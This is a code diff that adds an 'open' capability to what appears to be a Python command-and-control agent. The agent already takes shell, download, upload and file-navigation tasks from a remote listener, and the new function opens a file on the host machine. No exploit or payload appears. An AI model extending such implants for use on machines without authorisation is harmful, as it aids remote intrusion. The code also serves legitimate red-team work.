@@ -10,6 +10,7 @@ import random
 import shutil
 import socket
 import subprocess
+import sys
 import time
 import urllib.error
 import urllib.request
@@ -393,6 +394,29 @@ def upload_capability(context):
                 message=f"Unknown message type received during upload: {msg_type}",
             )
             break
+
+
+def open_capability(context):
+    path = context.arguments["path"]
+    if sys.platform == "win32":
+        try:
+            os.startfile(path)
+        except OSError as exc:
+            context.connection.post_task_message_to_listener(
+                task_id=context.task_id,
+                success=False,
+                message=f"Failed to open file '{path}': {exc}",
+            )
+    else:
+        cmd = ["open", path] if sys.platform == "darwin" else ["xdg-open", path]
+        try:
+            subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        except FileNotFoundError as e:
+            context.connection.post_task_message_to_listener(
+                task_id=context.task_id,
+                success=False,
+                message=f"Failed to open file '{path}': {e}",
+            )
 
 
 def cd_capability(context):
@@ -942,6 +966,7 @@ class Agent:
             "shell": shell_capability,
             "download": download_capability,
             "upload": upload_capability,
+            "open": open_capability,
             "cd": cd_capability,
             "ls": ls_capability,
             "pwd": pwd_capability,
